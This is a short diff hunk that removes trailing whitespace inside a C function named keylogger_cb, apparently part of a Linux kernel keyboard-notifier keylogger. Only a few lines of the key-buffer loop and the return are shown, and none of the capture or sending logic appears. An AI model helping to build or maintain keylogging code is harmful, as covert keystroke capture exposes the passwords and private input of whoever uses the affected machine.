@@ -62,7 +62,7 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
                 key_index++;
             }
         }
-    } 
+    }
 
     return NOTIFY_OK; 
 }
